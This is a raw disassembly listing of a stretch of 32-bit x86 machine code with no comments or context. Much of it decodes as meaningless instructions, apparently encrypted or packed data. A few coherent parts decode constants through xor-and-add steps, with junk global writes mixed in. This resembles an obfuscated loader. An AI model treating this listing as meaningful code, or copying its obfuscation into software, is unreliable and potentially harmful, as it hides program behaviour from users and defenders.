  40627d:	jg     0x406213
  40627f:	sub    DWORD PTR ds:0xc122b5ef,edx
  406285:	jbe    0x4062df
  406287:	les    ebp,FWORD PTR [eax+eiz*1-0x1e]
  40628b:	jbe    0x4062e2
  40628d:	xor    bl,BYTE PTR [esi-0x63]
  406290:	cmp    al,0x7a
  406292:	and    eax,0xaf5815eb
  406297:	sub    eax,0x150b63b2
  40629c:	mov    ds:0xf2bfaa0b,al
  4062a1:	inc    ebx
  4062a2:	loop   0x4062e6
  4062a4:	and    BYTE PTR [eax+0xfcadc4],dh
  4062aa:	cdq    
  4062ab:	jmp    0x406237
  4062ad:	add    ebx,edx
  4062af:	jo     0x40628e
  4062b1:	pop    ebx
  4062b2:	sub    DWORD PTR [edi],edx
  4062b4:	sbb    BYTE PTR [eax],cl
  4062b6:	data16 xor BYTE PTR [edi+ecx*1+0x20ab0ecb],bl
  4062be:	cmp    ebp,DWORD PTR [eax]
  4062c0:	jmp    0x40631b
  4062c2:	adc    BYTE PTR ds:[ecx+ecx*2],ch
  4062c6:	mov    ch,0xde
  4062c8:	call   0xd5e1026b
  4062cd:	xor    ebx,ebp
  4062cf:	push   ds
  4062d0:	push   ecx
  4062d1:	pusha  
  4062d2:	std    
  4062d3:	mov    ch,0xc9
  4062d5:	xchg   al,dl
  4062d7:	jae    0x4062d9
  4062d9:	jo     0x4062ba
  4062db:	ds pop edi
  4062dd:	mov    dl,0xbf
  4062df:	jae    0x4062f4
  4062e1:	outs   dx,BYTE PTR ds:[esi]
  4062e2:	into   
  4062e3:	clc    
  4062e4:	adc    al,dh
  4062e6:	cld    
  4062e7:	dec    edi
  4062e8:	push   ebx
  4062e9:	sahf   
  4062ea:	jl     0x40632d
  4062ec:	rcl    BYTE PTR [edi-0x4d],0x7e
  4062f0:	mov    cl,0x78
  4062f2:	aas    
  4062f3:	(bad)
  4062f6:	jecxz  0x4062b9
  4062f8:	in     al,0xcb
  4062fa:	sbb    al,0x3d
  4062fc:	mov    ebp,0x5b255b80
  406301:	(bad)  
  406302:	cmp    esi,edi
  406304:	xchg   esp,eax
  406305:	fwait
  406306:	in     al,0x7e
  406308:	cld    
  406309:	hlt    
  40630a:	lods   eax,DWORD PTR ds:[esi]
  40630b:	or     eax,ecx
  40630d:	inc    edi
  40630e:	dec    edx
  40630f:	add    ebp,DWORD PTR [edx+ebp*8]
  406312:	adc    DWORD PTR [edx+eiz*8],esi
  406315:	xor    ecx,DWORD PTR [eax-0x3d]
  406318:	cmp    al,ah
  40631a:	add    eax,0x3366db65
  40631f:	jne    0x406308
  406321:	scas   eax,DWORD PTR es:[edi]
  406322:	cmp    eax,0xcdc8e82e
  406327:	loop   0x4062d0
  406329:	fwait
  40632a:	out    dx,al
  40632b:	std    
  40632c:	out    0x5c,eax
  40632e:	lahf   
  40632f:	xchg   DWORD PTR [ecx-0x3b022000],edx
  406335:	popa   
  406336:	icebp  
  406337:	out    0x2d,al
  406339:	or     al,0x28
  40633b:	lea    ebx,[ecx]
  40633d:	xor    ebx,eax
  40633f:	inc    esi
  406340:	stos   DWORD PTR es:[edi],eax
  406341:	mov    eax,0x23721fe3
  406346:	mov    eax,ds:0x10c79b06
  40634b:	test   al,0xfe
  40634d:	inc    bl
  40634f:	xchg   ebx,eax
  406350:	xchg   edi,eax
  406351:	lds    eax,FWORD PTR [ecx-0x5]
  406354:	cmp    cl,BYTE PTR [edi-0x2]
  406357:	(bad)  
  406358:	sbb    ecx,DWORD PTR [ebp+0x339ad207]
  40635e:	sub    eax,0x77bed2ad
  406363:	imul   esi,edi,0xbb81dd74
  406369:	pop    ebx
  40636a:	repnz mov WORD PTR [ebp-0x40],fs
  40636e:	jb     0x40632f
  406370:	dec    edx
  406371:	jno    0x4063a2
  406373:	out    0x5d,eax
  406375:	jbe    0x40632f
  406377:	inc    edx
  406378:	scas   al,BYTE PTR es:[edi]
  406379:	call   0x350f9b3c
  40637e:	(bad)  
  40637f:	cmp    ebp,DWORD PTR [eax+0x76f8dd31]
  406385:	and    ebp,DWORD PTR [bx+di+0x6d]
  406389:	mov    ds:0x8c57b806,eax
  40638e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40638f:	pop    ss
  406390:	sbb    eax,0xa8c77bf8
  406395:	loop   0x4063d0
  406397:	xchg   ebx,eax
  406398:	cmp    eax,0x459ae315
  40639d:	or     DWORD PTR [edx-0x3],0xfffffff6
  4063a1:	(bad)  
  4063a2:	mov    bh,0x24
  4063a4:	(bad)  
  4063a5:	jae    0x406412
  4063a7:	leave  
  4063a8:	dec    ecx
  4063a9:	mov    ah,0xe7
  4063ab:	je     0x4063f7
  4063ad:	cmc    
  4063ae:	xor    al,0x5e
  4063b0:	add    eax,0xf12b6c5c
  4063b5:	mov    dl,0x29
  4063b7:	dec    ebp
  4063b8:	and    al,0x81
  4063ba:	sub    esp,ebx
  4063bc:	add    edx,0x4cdf0b3f
  4063c2:	adc    eax,0xc8ed05d8
  4063c7:	lods   al,BYTE PTR ds:[esi]
  4063c8:	sbb    al,BYTE PTR ds:0xdf8d83dc
  4063ce:	ins    BYTE PTR es:[edi],dx
  4063cf:	sub    bh,BYTE PTR [esi]
  4063d1:	xor    eax,0xc2c43fc9
  4063d6:	pop    es
  4063d7:	test   eax,0x6c3cd81a
  4063dc:	xor    ebp,DWORD PTR ds:0x5f8fdeb8
  4063e2:	xor    DWORD PTR [edi],esp
  4063e4:	pop    esp
  4063e5:	ins    DWORD PTR es:[edi],dx
  4063e6:	ret    0x51cc
  4063e9:	out    0xcd,al
  4063eb:	shl    DWORD PTR [ecx],cl
  4063ed:	push   es
  4063ee:	in     eax,dx
  4063ef:	and    cl,BYTE PTR [eax+ebp*4]
  4063f2:	aas    
  4063f3:	cmp    eax,0x4fa2f645
  4063f8:	xor    al,0x47
  4063fa:	inc    esp
  4063fb:	aam    0xcb
  4063fd:	call   0x1cea5ca4
  406402:	push   ds
  406403:	fidivr WORD PTR [ecx]
  406405:	outs   dx,DWORD PTR ds:[esi]
  406406:	popa   
  406407:	inc    esp
  406408:	in     ax,0xac
  40640b:	xor    BYTE PTR [edx+0x1efbe7ca],al
  406411:	or     al,0xb0
  406413:	mov    al,ds:0x8dc14219
  406418:	add    al,ch
  40641a:	mov    ecx,0xb5a56777
  40641f:	push   eax
  406420:	cld    
  406421:	mov    esp,0x87dc3eca
  406426:	mov    eax,0x7e250e8a
  40642b:	fist   WORD PTR [eax-0x49]
  40642e:	inc    ebx
  40642f:	scas   eax,DWORD PTR es:[edi]
  406430:	add    eax,0xe69fa0f1
  406435:	inc    ebx
  406436:	nop
  406437:	lahf   
  406438:	loope  0x4063c6
  40643a:	sbb    BYTE PTR [ebx],dh
  40643c:	adc    BYTE PTR [esi-0x33],0xc9
  406440:	ror    DWORD PTR [esi+esi*2-0x4e],1
  406444:	inc    edi
  406445:	fmul   DWORD PTR [ecx+0x3581e045]
  40644b:	xchg   BYTE PTR [ebx+0x43],al
  40644e:	add    ah,dh
  406450:	es inc ebx
  406452:	add    bh,al
  406454:	inc    ebp
  406455:	fdiv   DWORD PTR [ecx]
  406457:	mov    ch,0x9c
  406459:	clc    
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	(bad)  
  406559:	xor    BYTE PTR [ecx-0x2b],cl
  40655c:	imul   edi,DWORD PTR [esi],0x70
  40655f:	jo     0x406581
  406561:	jge    0x4065d3
  406563:	jo     0x4064f7
  406565:	stos   DWORD PTR es:[edi],eax
  406566:	ds jmp 0x40653a
  406569:	sub    bh,al
  40656b:	and    BYTE PTR [edx+0xc01168d],bl
  406571:	imul   edi,DWORD PTR [esi+0x38beb64a],0xf958319e
  40657b:	(bad)  
  40657c:	popa   
  40657d:	test   ah,bh
  40657f:	and    dl,BYTE PTR [ecx-0x66]
  406582:	out    0x8b,eax
  406584:	xor    esi,DWORD PTR [ebp+0x34]
  406587:	adc    esp,ebx
  406589:	outs   dx,BYTE PTR ds:[esi]
  40658a:	ret    
  40658b:	dec    ecx
  40658c:	jmp    0x401fe58
  406591:	xlat   BYTE PTR ds:[ebx]
  406592:	jge    0x4065a3
  406594:	sub    al,0x55
  406596:	dec    ebp
  406597:	jle    0x406582
  406599:	sub    cl,BYTE PTR [eax]
  40659b:	xlat   BYTE PTR ds:[ebx]
  40659c:	cdq    
  40659d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40659e:	pop    eax
  40659f:	push   edx
  4065a0:	sbb    DWORD PTR ds:0x3a0992e6,0x2a
  4065a7:	addr16 or ah,dl
  4065aa:	fstp   DWORD PTR [ebx-0x308e38d1]
  4065b0:	loope  0x4065a1
  4065b2:	imul   edx,DWORD PTR [edx-0x45769189],0xffffff96
  4065b9:	dec    esi
  4065ba:	icebp  
  4065bb:	mov    esp,0xb9f08d79
  4065c0:	fcom   QWORD PTR [edx]
  4065c2:	mov    esp,0x81c7b188
  4065c7:	adc    eax,0x3381a00
  4065cc:	fcmovb st,st(0)
  4065ce:	popa   
  4065cf:	(bad)  
  4065d0:	lods   eax,DWORD PTR ds:[esi]
  4065d1:	ret    0xfe6f
  4065d4:	in     al,dx
  4065d5:	jl     0x406608
  4065d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d8:	adc    BYTE PTR [edi+0x16822fc8],bl
  4065de:	mov    dl,0x73
  4065e0:	sub    DWORD PTR [ebp+0x3fc4b1e0],ebx
  4065e6:	rcl    edi,0xe8
  4065e9:	xchg   BYTE PTR [ebx-0x26db5923],al
  4065ef:	lock mov BYTE PTR [esi],ch
  4065f2:	cmp    DWORD PTR [ecx+0x6e705a03],ebp
  4065f8:	adc    al,0x80
  4065fa:	inc    edx
  4065fb:	mov    BYTE PTR [edi+eax*8],bl
  4065fe:	push   ebx
  4065ff:	jl     0x406649
  406601:	popf   
  406602:	jbe    0x4065fa
  406604:	stc    
  406605:	mov    eax,ds:0x1584bc13
  40660a:	stos   BYTE PTR es:[edi],al
  40660b:	cmp    edx,esi
  40660d:	repz push edx
  40660f:	xor    ebx,DWORD PTR [edx]
  406611:	push   esi
  406612:	adc    edx,DWORD PTR [edx-0x56]
  406615:	sbb    al,0xf6
  406617:	mov    DWORD PTR [edx-0x78],edi
  40661a:	fcom   DWORD PTR [ebx-0x6c82dbc2]
  406620:	cmp    eax,0x868f5477
  406625:	rcl    DWORD PTR [ebp+0x5b],1
  406628:	mov    ah,dh
  40662a:	adc    bh,ah
  40662c:	in     eax,dx
  40662d:	push   0x5
  40662f:	out    0x25,eax
  406631:	push   esi
  406632:	or     al,0xfa
  406634:	lods   eax,DWORD PTR ds:[esi]
  406635:	mov    eax,0x6b68fea8
  40663a:	add    al,0x19
  40663c:	fld    DWORD PTR [ecx+0x51]
  40663f:	push   ecx
  406640:	lahf   
  406641:	(bad)  
  406642:	sahf   
  406643:	xchg   BYTE PTR [esi],ah
  406645:	jle    0x4066a9
  406647:	dec    ebp
  406648:	or     BYTE PTR ds:0x9f73217d,0xf7
  40664f:	stos   DWORD PTR es:[edi],eax
  406650:	mov    ah,0x2b
  406652:	add    DWORD PTR [eax],ebp
  406654:	dec    eax
  406655:	call   0x6d7a36b0
  40665a:	cmp    esi,DWORD PTR ds:0x74f0c66d
  406660:	xchg   edi,eax
  406661:	or     dl,BYTE PTR [edi]
  406663:	inc    eax
  406664:	ins    BYTE PTR es:[edi],dx
  406665:	xor    ecx,DWORD PTR [ebx-0x52428e6]
  40666b:	out    0xc2,al
  40666d:	and    BYTE PTR [ebx],0xb2
  406670:	jmp    0x406619
  406672:	jmp    0xaeb88eaf
  406677:	pop    esi
  406678:	or     dl,bl
  40667a:	mov    eax,ds:0xe8e613ca
  40667f:	es and eax,0x55f3ab2a
  406685:	and    al,ch
  406687:	fs adc eax,0xcd019b68
  40668d:	dec    ecx
  40668e:	push   edx
  40668f:	dec    ecx
  406690:	mov    cl,0x37
  406692:	cld    
  406693:	iret   
  406694:	sbb    bh,ch
  406696:	cmp    esi,eax
  406698:	gs icebp 
  40669a:	shr    BYTE PTR [edi+ebx*4+0x7e4f1565],0xd6
  4066a2:	(bad)
  4066a6:	add    eax,0x167b8234
  4066ab:	mov    ch,0x9f
  4066ad:	xor    al,0xde
  4066af:	sbb    al,0xc0
  4066b1:	xlat   BYTE PTR ds:[ebx]
  4066b2:	xchg   esi,eax
  4066b3:	jmp    0x61fe1766
  4066b8:	xchg   ebx,eax
  4066b9:	mov    ds:0x3d9a4ea3,al
  4066be:	das    
  4066bf:	sbb    edx,DWORD PTR ds:[edx-0x79545187]
  4066c6:	xlat   BYTE PTR ds:[ebx]
  4066c7:	pop    ecx
  4066c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c9:	xchg   ecx,eax
  4066ca:	xchg   BYTE PTR [edi+0x75c5b5cd],bh
  4066d0:	shr    DWORD PTR [ecx-0x19583b2f],cl
  4066d6:	inc    eax
  4066d7:	ror    BYTE PTR [ebx],1
  4066d9:	mov    dh,0xf8
  4066db:	push   ebx
  4066dc:	jnp    0x4066a1
  4066de:	mov    edx,DWORD PTR [edx]
  4066e0:	pop    DWORD PTR [edx]
  4066e2:	adc    esp,DWORD PTR [ebp-0x9]
  4066e5:	xchg   esi,eax
  4066e6:	cmp    DWORD PTR [eax+0x58],esp
  4066e9:	in     al,dx
  4066ea:	xor    al,0xba
  4066ec:	sub    eax,0x996ad714
  4066f1:	cmp    BYTE PTR [eax+0x72f28b87],cl
  4066f7:	jne    0x4066a3
  4066f9:	sub    ch,BYTE PTR [eax]
  4066fb:	rol    BYTE PTR [ebx],0x93
  4066fe:	mov    esi,0xa14205db
  406703:	es std 
  406705:	pop    esi
  406706:	daa    
  406707:	adc    al,0x17
  406709:	jae    0x4066e8
  40670b:	cmp    bh,BYTE PTR [edi+0x3c]
  40670e:	dec    ecx
  40670f:	gs mov dl,0x1c
  406712:	mov    ds:0x10553139,eax
  406717:	int3   
  406718:	xchg   esp,eax
  406719:	adc    ebx,DWORD PTR es:0x235b5668
  406720:	stos   DWORD PTR es:[edi],eax
  406721:	lds    eax,FWORD PTR [ebx+0x2a0f41bf]
  406727:	mov    edx,0xe415ef2e
  40672c:	les    ecx,FWORD PTR [ebx-0x32]
  40672f:	fild   WORD PTR [ebx-0x3ee22c60]
  406735:	xchg   edi,eax
  406736:	cs retf 
  406738:	in     eax,0x17
  40673a:	sbb    al,0x50
  40673c:	add    DWORD PTR [edi+0x6f],edx
  40673f:	cmc    
  406740:	jae    0x406784
  406742:	js     0x40671c
  406744:	imul   esp,DWORD PTR [edi+0x4d],0x66
  406748:	xchg   esi,eax
  406749:	leave  
  40674a:	ja     0x40678f
  40674c:	xchg   esp,eax
  40674d:	xchg   edx,eax
  40674e:	lahf   
  40674f:	rcl    ebp,1
  406751:	hlt    
  406752:	xlat   BYTE PTR gs:[ebx]
  406754:	jmp    0x5959:0x6cb2320
  40675b:	adc    ebx,edi
  40675d:	or     BYTE PTR [ebx+0x1f],bl
  406760:	pop    es
  406761:	neg    BYTE PTR [esp+edi*8-0x29]
  406765:	(bad)  [edi]
  406767:	retf   
  406768:	pop    ecx
  406769:	xchg   edx,eax
  40676a:	xchg   DWORD PTR [edx],ebp
  40676c:	aas    
  40676d:	rcl    DWORD PTR [edi+eiz*8-0xd],0x71
  406772:	aad    0xb8
  406774:	stos   BYTE PTR es:[edi],al
  406775:	jp     0x4067ce
  406777:	fwait
  406778:	xchg   esp,eax
  406779:	mov    BYTE PTR [eax+0x4253b3c8],al
  40677f:	sub    BYTE PTR [ebx-0x6eeeaa7b],dh
  406785:	xchg   ebx,eax
  406786:	pop    es
  406787:	mov    ds:0x365ed5e2,al
  40678c:	cs dec eax
  40678e:	(bad)  
  40678f:	xor    eax,0xaf20010b
  406794:	fcmovbe st,st(4)
  406796:	les    esp,FWORD PTR [ebp-0x1a]
  406799:	jnp    0x406762
  40679b:	mov    ds:0xa98caf31,eax
  4067a0:	test   cl,0x64
  4067a3:	in     al,dx
  4067a4:	pusha  
  4067a5:	inc    ecx
  4067a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067a7:	adc    bh,BYTE PTR [edx+0x1c]
  4067aa:	test   DWORD PTR [edx+0x7f],ecx
  4067ad:	movq   mm1,QWORD PTR [edx]
  4067b0:	push   esp
  4067b1:	je     0x4067c9
  4067b3:	ret    0x83d0
  4067b6:	jnp    0x40676c
  4067b8:	test   al,0x4d
  4067ba:	repnz adc esp,edx
  4067bd:	sub    al,0xca
  4067bf:	adc    edi,DWORD PTR [edx]
  4067c1:	xchg   BYTE PTR [edx],cl
  4067c3:	inc    ecx
  4067c4:	sbb    esi,edx
  4067c6:	dec    edx
  4067c7:	jg     0x406792
  4067c9:	mov    fs,WORD PTR [esp+ecx*1]
  4067cc:	mov    dl,0xb5
  4067ce:	mov    ecx,0x7fac0519
  4067d3:	sbb    BYTE PTR [edx],0x9b
  4067d6:	daa    
  4067d7:	sti    
  4067d8:	and    al,0xda
  4067da:	cld    
  4067db:	cwde   
  4067dc:	push   edx
  4067dd:	into   
  4067de:	fsub   QWORD PTR [ecx+ebp*1-0x4848fde1]
  4067e5:	aaa    
  4067e6:	mov    edx,0xd8ca8bb5
  4067eb:	jno    0x4067da
  4067ed:	call   0xb4412da2
  4067f2:	pop    eax
  4067f3:	adc    DWORD PTR [ecx+0x41],esp
  4067f6:	ror    bl,cl
  4067f8:	jl     0x4067b7
  4067fa:	cdq    
  4067fb:	cli    
  4067fc:	mov    dl,0x1f
  4067fe:	pop    edi
  4067ff:	(bad)  
  406800:	jno    0x40680d
  406802:	repnz mov ds:0x1b2fa448,al
  406808:	or     eax,0x276b50f3
  40680d:	scas   al,BYTE PTR es:[edi]
  40680e:	ror    bh,cl
  406810:	call   FWORD PTR [esi-0x2d77ab5b]
  406816:	mov    bl,0x7
  406818:	mov    ebx,0xe3c57b2c
  40681d:	mov    bl,ch
  40681f:	inc    ebx
  406820:	sbb    eax,0xf89e54e4
  406825:	sbb    DWORD PTR [ecx],esp
  406827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406828:	inc    eax
  406829:	xor    DWORD PTR ds:0xdd249d17,ebx
  40682f:	dec    eax
  406830:	aad    0x45
  406832:	sub    eax,0x95cf1c57
  406837:	push   edx
  406838:	pop    es
  406839:	pushf  
  40683a:	test   eax,0xd711bd8f
  40683f:	pop    ecx
  406840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406841:	daa    
  406842:	aad    0x3e
  406844:	aas    
  406845:	sub    al,0x4
  406847:	in     eax,0xa7
  406849:	pop    ecx
  40684a:	and    cl,0xa5
  40684d:	mov    al,ds:0x2e25f7a5
  406852:	mov    ebp,0x4b567a23
  406857:	inc    esi
  406858:	or     ebp,DWORD PTR [esp+eiz*2-0x56740f17]
  40685f:	sub    bl,BYTE PTR [edi-0x5b]
  406862:	lods   al,BYTE PTR ds:[esi]
  406863:	ffree  st(1)
  406865:	or     eax,0xb87c410a
  40686a:	test   al,0x8c
  40686c:	mov    cl,BYTE PTR [eax]
  40686e:	jg     0x406865
  406870:	sbb    eax,0xa4c49bef
  406875:	push   edi
  406876:	dec    edx
  406877:	dec    eax
  406878:	push   0x67
  40687a:	ror    BYTE PTR [esp+esi*4+0xc389e18],0x62
  406882:	test   eax,0x3112f061
  406887:	out    0x23,eax
  406889:	and    DWORD PTR [eax-0x51],0x30956f2
  406890:	mov    ecx,edi
  406892:	mov    ds:0xc7c085f0,eax
  406897:	add    eax,0x434425
  40689c:	jno    0x406917
  40689e:	add    BYTE PTR [eax],al
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432dca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406990:	cmp    eax,0x3a1b9606
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406938
  40699c:	inc    esi
  40699d:	and    al,0xb7
  40699f:	xor    bl,BYTE PTR [esi+0x7c]
  4069a2:	cmc    
  4069a3:	mov    cl,0xdb
  4069a5:	nop
  4069a6:	dec    esi
  4069a7:	out    dx,al
  4069a8:	call   0xd913:0x67ec8376
  4069af:	pop    ebx
  4069b0:	sbb    ecx,DWORD PTR [ecx+0x3b]
  4069b3:	jbe    0x4069d1
  4069b5:	xchg   edx,eax
  4069b6:	inc    edx
  4069b7:	xchg   DWORD PTR ds:0x950360ed,esp
  4069bd:	adc    ebp,edi
  4069bf:	cmp    BYTE PTR [ebp-0x6724cb4b],ch
  4069c5:	stos   BYTE PTR es:[edi],al
  4069c6:	xor    eax,0xf8b8eb56
  4069cb:	xor    BYTE PTR [esi-0x3b],0xf8
  4069cf:	or     ebp,DWORD PTR [esi]
  4069d1:	out    0x30,al
  4069d3:	call   0x6707:0x6c5ab996
  4069da:	sbb    eax,0x695e8e81
  4069df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e0:	cmp    ah,cl
  4069e2:	shl    DWORD PTR ds:0x6b9891ab,1
  4069e8:	push   edx
  4069e9:	imul   ebx,eax,0x1d23e6bf
  4069ef:	mov    eax,ds:0xdaade483
  4069f4:	xchg   ecx,eax
  4069f5:	jns    0x406a00
  4069f7:	add    al,0xb1
  4069f9:	xor    al,0xec
  4069fb:	or     DWORD PTR ds:0xcf689d2e,ecx
  406a01:	pop    edx
  406a02:	jmp    0x6ff4dfa0
  406a07:	into   
  406a08:	dec    esp
  406a09:	addr16 je 0x4069a9
  406a0c:	inc    ebp
  406a0d:	inc    eax
  406a0e:	jae    0x406a42
  406a10:	or     eax,0xc4c2bfea
  406a15:	pop    ecx
  406a16:	cdq    
  406a17:	add    DWORD PTR [eax],esp
  406a19:	adc    DWORD PTR [eax+0x42],eax
  406a1c:	jnp    0x406a90
  406a1e:	cmp    al,BYTE PTR [edx]
  406a20:	js     0x406a8e
  406a22:	les    esp,FWORD PTR [esi-0x394ae9c5]
  406a28:	inc    esp
  406a29:	xchg   edx,eax
  406a2a:	daa    
  406a2b:	and    eax,0x3c623b4d
  406a30:	dec    BYTE PTR [esi+ebp*1]
  406a33:	repnz push edx
  406a35:	rcr    DWORD PTR fs:[edx+edx*8-0x47469676],1
  406a3d:	mov    ds,WORD PTR [eax]
  406a3f:	loope  0x4069cc
  406a41:	(bad)  
  406a42:	and    edx,DWORD PTR [esi+edx*4+0x3ab09e9d]
  406a49:	inc    ecx
  406a4a:	and    al,0x61
  406a4c:	std    
  406a4d:	stos   DWORD PTR es:[edi],eax
  406a4e:	rol    BYTE PTR [edx+0x65fb9fbc],cl
  406a54:	add    dh,BYTE PTR [eax+ecx*4+0x414d89d4]
  406a5b:	xchg   esi,eax
  406a5c:	sbb    cl,BYTE PTR [esi-0x6b]
  406a5f:	daa    
  406a60:	popf   
  406a61:	push   0x9fd97f39
  406a66:	inc    BYTE PTR [edx-0x43]
  406a69:	nop
  406a6a:	lods   eax,DWORD PTR ds:[esi]
  406a6b:	mov    dl,0x65
  406a6d:	hlt    
  406a6e:	cmp    ebx,edx
  406a70:	std    
  406a71:	hlt    
  406a72:	mov    bh,0xeb
  406a74:	into   
  406a75:	add    al,0xb5
  406a77:	push   0x6a
  406a79:	cmp    esp,DWORD PTR [edx+edx*8]
  406a7c:	lods   eax,DWORD PTR ds:[esi]
  406a7d:	cmp    al,0x94
  406a7f:	cmp    ebx,DWORD PTR [esi]
  406a81:	sub    bl,ch
  406a83:	jle    0x406a88
  406a85:	test   ah,ch
  406a87:	adc    eax,0x60df297
  406a8c:	data16 mov ch,0x97
  406a8f:	ss test al,0x17
  406a92:	cmp    al,0xe8
  406a94:	sbb    BYTE PTR [esp+edi*4-0x3d09ee5b],0x9b
  406a9c:	ret    0x5317
  406a9f:	xchg   esp,eax
  406aa0:	sub    al,0xf7
  406aa2:	imul   edi,DWORD PTR [ebx+0x50d559],0xffffffa2
  406aa9:	add    eax,0xe471d96c
  406aae:	and    al,0x3f
  406ab0:	pop    ebp
  406ab1:	ss push ss
  406ab3:	shl    BYTE PTR [ebx],1
  406ab5:	jecxz  0x406b1a
  406ab7:	mov    ebp,0xa04ea730
  406abc:	mov    edx,eax
  406abe:	push   es
  406abf:	lods   al,BYTE PTR ds:[esi]
  406ac0:	imul   ecx,DWORD PTR [ebx],0x6377a236
  406ac6:	mov    cl,0x7a
  406ac8:	fidivr WORD PTR [edi+0xc1f7cbf]
  406ace:	or     bl,BYTE PTR [ebx]
  406ad0:	push   edx
  406ad1:	jmp    0x87fc07e6
  406ad6:	sahf   
  406ad7:	(bad)  
  406ad8:	data16 sub BYTE PTR [ebx-0xe098690],0xed
  406ae0:	test   BYTE PTR [eax+eax*1-0x69ad40e],dl
  406ae7:	(bad)  
  406ae8:	scas   al,BYTE PTR es:[edi]
  406ae9:	sub    ebp,DWORD PTR [esi-0x3]
  406aec:	mov    cl,BYTE PTR [edx+0x72]
  406aef:	(bad)  
  406af0:	cmp    BYTE PTR ds:0x61dd00bd,al
  406af6:	les    eax,FWORD PTR [ebx-0x5ef3069a]
  406afc:	jb     0x406b6d
